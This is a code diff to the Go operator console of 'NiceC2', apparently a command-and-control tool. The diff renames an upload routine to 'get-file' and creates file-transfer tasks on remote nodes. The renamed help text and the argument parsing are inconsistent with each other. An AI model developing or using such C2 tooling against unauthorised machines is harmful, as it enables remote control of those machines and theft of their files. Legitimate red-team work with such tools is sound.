@@ -67,7 +67,7 @@ func main() {
 			fmt.Println("reboot <node>\t\t\t\t\t\t- Reboot device")
 			fmt.Println("Exit\t\t\t\t\t\t\t- Exit the NiceC2 interface")
 			fmt.Println("get-file <node> -f <file> -d <destination path>\t\t- Download file to the client.")
-			fmt.Println("send-file <node> <filepath>\t\t- Upload file from the client.")
+			fmt.Println("send-file <node> <filepath>\t\t- get-file file from the client.")
 
 		}
 		if strings.Compare("exit", text) == 0 {
@@ -127,12 +127,12 @@ func main() {
 
 			text := text[9:]
 
-			node, path, err := parse_upload(text)
+			node, path, err := parse_get_file(text)
 			if err != nil {
 				fmt.Println(err)
 
 			} else {
-				upload(node, path)
+				get_file(node, path)
 				// upload(text)
 			}
 
@@ -142,7 +142,7 @@ func main() {
 
 }
 
-func parse_upload(input string) (string, string, error) {
+func parse_get_file(input string) (string, string, error) {
 	// Split by -f first
 	parts := strings.Split(input, " -p ")
 	if len(parts) != 2 {
@@ -152,10 +152,10 @@ func parse_upload(input string) (string, string, error) {
 	return parts[0], parts[1], nil
 }
 
-func upload(node string, path string) {
+func get_file(node string, path string) {
 
-	task_id := create_task_by_ID(node, "upload", path, "2")
-	fmt.Println("Upload Task created (" + task_id + ")")
+	task_id := create_task_by_ID(node, "get-file", path, "2")
+	fmt.Println("get-file Task created (" + task_id + ")")
 	time.Sleep(5 * time.Second) // Time is added to wait for command to get to / be run on node
 	get_task_by_id(task_id)
 }
